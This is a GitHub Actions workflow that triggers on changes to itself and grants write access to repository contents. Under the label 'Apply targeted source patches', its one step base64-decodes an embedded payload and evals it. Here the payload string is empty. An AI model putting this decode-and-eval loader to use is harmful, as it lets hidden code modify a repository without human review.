name: Finish console fixes

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/finish-console.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - name: Apply targeted source patches
        uses: actions/github-script@v7
        with:
          script: |
            const payload = '';
            const code = Buffer.from(payload, 'base64').toString('utf8');
            await eval('(async () => {\n' + code + '\n})()');
